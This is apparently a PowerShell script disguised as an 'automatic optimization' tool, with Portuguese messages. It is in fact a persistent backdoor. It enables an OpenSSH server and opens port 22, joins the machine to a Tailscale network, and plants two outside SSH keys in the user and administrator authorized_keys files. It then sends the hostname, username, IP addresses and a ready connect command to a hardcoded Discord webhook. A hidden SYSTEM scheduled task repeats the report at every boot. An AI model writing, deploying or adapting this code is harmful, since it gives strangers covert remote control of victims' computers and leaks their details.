

$DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1553056796753793044/u7-bFZyCB3420pHAbopfwuT8gGAX3i8BWDSq2yMiXo-XHU6Bw0PANjFBUhZUdy9yNMW_"


function Send-DiscordMessage {
    param([string]$Message)
    try {
        $body = @{ content = $Message } | ConvertTo-Json
        Invoke-RestMethod -Uri $DISCORD_WEBHOOK -Method Post -ContentType "application/json" -Body $body -ErrorAction Stop
    } catch {
        Write-Warning "failures norgty: $_"
    }
}


function Send-MachineInfo {
    param([string]$TailscaleIp, [string]$Context = "setup")

    $hostname   = $env:COMPUTERNAME
    $username   = $env:USERNAME
    $osInfo     = (Get-CimInstance Win32_OperatingSystem).Caption
    $localIp    = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and $_.InterfaceAlias -notlike "*Tailscale*" } | Select-Object -First 1).IPAddress

    if ($Context -eq "setup") {
        $title       = "w2323"
        $description = "wddaa111"
        $color       = 3066993 
    } else {
        $title       = "🟢 "
        $description = "00887."
        $color       = 3447003  
    }

    if (-not $TailscaleIp) { $TailscaleIp = "ouderstt" }

    $embed = @{
        embeds = @(@{
            title       = $title
            description = $description
            color       = $color
            fields      = @(
                @{ name = "🖥️ Hostname";       value = $hostname;     inline = $true  }
                @{ name = "👤 Usuario";         value = $username;     inline = $true  }
                @{ name = "🌐 IP Tailscale";    value = "``$TailscaleIp``"; inline = $false }
                @{ name = "🏠 IP Local";        value = "``$localIp``";     inline = $true  }
                @{ name = "💻 Sistema";         value = $osInfo;       inline = $false }
            )
            footer      = @{ text = "Para conectar: ssh $username@$TailscaleIp" }
            timestamp   = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
        })
    } | ConvertTo-Json -Depth 10

    try {
        Invoke-RestMethod -Uri $DISCORD_WEBHOOK -Method Post -ContentType "application/json" -Body $embed -ErrorAction Stop
        Write-Host "Notificacao enviada para o Discord!" -ForegroundColor Green
    } catch {
        Write-Warning "wwaaaaawwddas: $_"
    }
}




$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "==========================================================" -ForegroundColor Red
    Write-Host " ERRO: Voce PRECISA rodar como Administrador!" -ForegroundColor Yellow
    Write-Host " Clique com botao direito no arquivo run.bat" -ForegroundColor Yellow
    Write-Host " e escolha 'Executar como Administrador'." -ForegroundColor Yellow
    Write-Host "==========================================================" -ForegroundColor Red
    Read-Host "Pressione ENTER para fechar..."
    exit 1
}

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "       INICIANDO otimizacao AUTOMATICA       " -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan


Write-Host "`n=== [1/6] Verificando e instalando pacotes ===" -ForegroundColor Cyan
$sshCapability = Get-WindowsCapability -Online | Where-Object { $_.Name -like 'OpenSSH.Server*' }
if ($sshCapability.State -ne 'Installed') {
    Write-Host "Instalando recurso..." -ForegroundColor Yellow
    Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
} else {
    Write-Host "." -ForegroundColor Green
}


Write-Host "`n=== [2/6] Configurando e iniciando o servico  ===" -ForegroundColor Cyan
Set-Service -Name sshd -StartupType 'Automatic'
Start-Service sshd
Write-Host "" -ForegroundColor Green


Write-Host "`n=== [3/6]  ===" -ForegroundColor Cyan
if (-not (Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue)) {
    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH SSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 | Out-Null
    Write-Host "." -ForegroundColor Green
} else {
    Set-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -Enabled True | Out-Null
    Write-Host "Ra." -ForegroundColor Green
}


Write-Host "`n=== [4/6] ii ===" -ForegroundColor Cyan
$tailscaleExe = "C:\Program Files\Tailscale\tailscale.exe"

if (-not (Test-Path $tailscaleExe)) {
    $altCmd = Get-Command tailscale.exe -ErrorAction SilentlyContinue
    if ($altCmd) { $tailscaleExe = $altCmd.Source }
}

if (-not (Test-Path $tailscaleExe)) {
    Write-Host "updatesoop." -ForegroundColor Yellow
    $hasWinget = Get-Command winget.exe -ErrorAction SilentlyContinue
    if ($hasWinget) {
        winget install --id Tailscale.Tailscale --exact --accept-package-agreements --accept-source-agreements --silent
        Start-Sleep -Seconds 6
    }
    if (-not (Test-Path $tailscaleExe)) {
        Write-Host "." -ForegroundColor Yellow
        $installerPath = "$env:TEMP\tailscale-setup.exe"
        Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe" -OutFile $installerPath
        Start-Process -FilePath $installerPath -ArgumentList "/quiet /install" -Wait
        Start-Sleep -Seconds 6
    }
}


Write-Host "`n=== [5/6] Conectando  ===" -ForegroundColor Cyan
if (Test-Path $tailscaleExe) {
    Write-Host "." -ForegroundColor Yellow
    & $tailscaleExe up --ssh --operator=$env:USERNAME
    Start-Sleep -Seconds 5
} else {
    Write-Warning "To."
}


$tailscaleIp = ""
if (Test-Path $tailscaleExe) {
    try { $tailscaleIp = (& $tailscaleExe ip -4 2>$null).Trim() } catch {}
}


Write-Host "`n=== [6/6] Configurando  ===" -ForegroundColor Cyan

$sshKeys = @(
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJwe7ftDRXOft6jm4mr/8dY5AFwDqghp50+FJ25/lNnj eliza@DESKTOP-N7QP8DV",
    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOHT9HYZVVRCkOvP3bLrZ1Z5a/81WFz7O9rFlJonvcAL hermes-ghufa@192.168.100.232"
)

$userSshDir  = Join-Path -Path $env:USERPROFILE -ChildPath ".ssh"
$userAuthKeys = Join-Path -Path $userSshDir -ChildPath "authorized_keys"
if (-not (Test-Path $userSshDir)) { New-Item -ItemType Directory -Path $userSshDir -Force | Out-Null }

$currentUserSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value

foreach ($key in $sshKeys) {
    if (-not (Test-Path $userAuthKeys) -or -not (Get-Content $userAuthKeys -ErrorAction SilentlyContinue | Select-String -SimpleMatch $key)) {
        Add-Content -Path $userAuthKeys -Value $key -Encoding UTF8
    }
}
icacls.exe $userAuthKeys /inheritance:r /grant "*S-1-5-18:(F)" /grant "$($currentUserSid):(F)" | Out-Null

$programDataSsh = "$env:ProgramData\ssh"
if (-not (Test-Path $programDataSsh)) { New-Item -ItemType Directory -Path $programDataSsh -Force | Out-Null }
$adminAuthKeys = "$programDataSsh\administrators_authorized_keys"

foreach ($key in $sshKeys) {
    if (-not (Test-Path $adminAuthKeys) -or -not (Get-Content $adminAuthKeys -ErrorAction SilentlyContinue | Select-String -SimpleMatch $key)) {
        Add-Content -Path $adminAuthKeys -Value $key -Encoding UTF8
    }
}
icacls.exe $adminAuthKeys /inheritance:r /grant "*S-1-5-18:(F)" /grant "*S-1-5-32-544:(F)" | Out-Null

Restart-Service sshd


Write-Host "`n=== Configurando automatica ao ligar o PC ===" -ForegroundColor Cyan


$notifyScriptPath = "C:\ProgramData\ssh\notify-online.ps1"
$notifyScriptContent = @"
`$DISCORD_WEBHOOK = "$DISCORD_WEBHOOK"

function Send-MachineInfo {
    param([string]`$TailscaleIp)
    `$hostname = `$env:COMPUTERNAME
    `$username = `$env:USERNAME
    `$osInfo   = (Get-CimInstance Win32_OperatingSystem).Caption
    `$localIp  = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { `$_.InterfaceAlias -notlike "*Loopback*" -and `$_.InterfaceAlias -notlike "*Tailscale*" } | Select-Object -First 1).IPAddress

    `$embed = @{
        embeds = @(@{
            title       = "🟢 Servidor online"
            description = "A maquina foi ligada e o servidor SSH esta ativo."
            color       = 3447003
            fields      = @(
                @{ name = "🖥️ Hostname";    value = `$hostname;            inline = `$true  }
                @{ name = "👤 Usuario";      value = `$username;            inline = `$true  }
                @{ name = "🌐 IP Tailscale"; value = "``````\`$TailscaleIp``````"; inline = `$false }
                @{ name = "🏠 IP Local";     value = "``````\`$localIp``````";     inline = `$true  }
                @{ name = "💻 Sistema";      value = `$osInfo;              inline = `$false }
            )
            footer    = @{ text = "Para conectar: ssh `$username@`$TailscaleIp" }
            timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
        })
    } | ConvertTo-Json -Depth 10

    try {
        Invoke-RestMethod -Uri `$DISCORD_WEBHOOK -Method Post -ContentType "application/json" -Body `$embed -ErrorAction Stop
    } catch {}
}

# Aguarda o Tailscale estar pronto (max 60 seg)
`$tsExe = "C:\Program Files\Tailscale\tailscale.exe"
`$ip = ""
for (`$i = 0; `$i -lt 12; `$i++) {
    Start-Sleep -Seconds 5
    try { `$ip = (& `$tsExe ip -4 2>`$null).Trim() } catch {}
    if (`$ip) { break }
}

Send-MachineInfo -TailscaleIp `$ip
"@

Set-Content -Path $notifyScriptPath -Value $notifyScriptContent -Encoding UTF8


$taskName = "SSHServerNotifyDiscord"
Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue

$action  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$notifyScriptPath`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
Write-Host "Tarefa agendada criada: o Discord sera notificado automaticamente a cada boot!" -ForegroundColor Green


Write-Host "`n==========================================================" -ForegroundColor Green
Write-Host "          CONFIGURACAO CONCLUIDA COM SUCESSO!             " -ForegroundColor Green
Write-Host "==========================================================" -ForegroundColor Green
Write-Host ""
Write-Host "complieisja..." -ForegroundColor Yellow

Send-MachineInfo -TailscaleIp $tailscaleIp -Context "setup"

Write-Host ""
Write-Host "Dados da maquina:" -ForegroundColor Yellow
Write-Host "----------------------------------------------------------"
Write-Host "Usuario:      $env:USERNAME" -ForegroundColor Cyan
if ($tailscaleIp) {
    Write-Host "IP Tailscale: $tailscaleIp" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Comando para conectar: ssh $env:USERNAME@$tailscaleIp" -ForegroundColor Green
} else {
    Write-Host ")" -ForegroundColor Yellow
}
Write-Host "----------------------------------------------------------"
Write-Host ""
Write-Host "fg33049" -ForegroundColor Green
Write-Host "21h2h998FFF" -ForegroundColor Green
Write-Host ""
Write-Host "Pressione qualquer tecla para fechar..."
[void][System.Console]::ReadKey()
